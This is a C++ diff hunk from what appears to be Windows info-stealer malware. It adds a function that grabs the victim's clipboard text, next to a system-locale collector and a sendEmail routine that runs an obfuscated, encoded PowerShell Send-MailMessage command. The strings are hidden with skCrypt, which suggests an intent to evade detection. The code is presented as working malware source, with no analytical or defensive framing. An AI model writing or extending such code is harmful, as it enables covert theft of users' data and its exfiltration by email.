@@ -325,6 +325,25 @@ string getLanguage() {
            string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, sizeof(buf)));
 }
 
+string getClipboard() {
+    string result = (string)skCrypt("none");
+    if (!OpenClipboard(nullptr))
+        return result;
+
+    HANDLE hData = GetClipboardData(CF_TEXT);
+    if (hData == nullptr)
+        return result;
+
+    char* pszText = static_cast<char*>(GlobalLock(hData));
+    if (pszText == nullptr)
+        return result;
+
+    result = pszText;
+    GlobalUnlock(hData);
+    CloseClipboard();
+    return result;
+}
+
 void sendEmail() {
     system(powershellEncodedCommand(
         (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
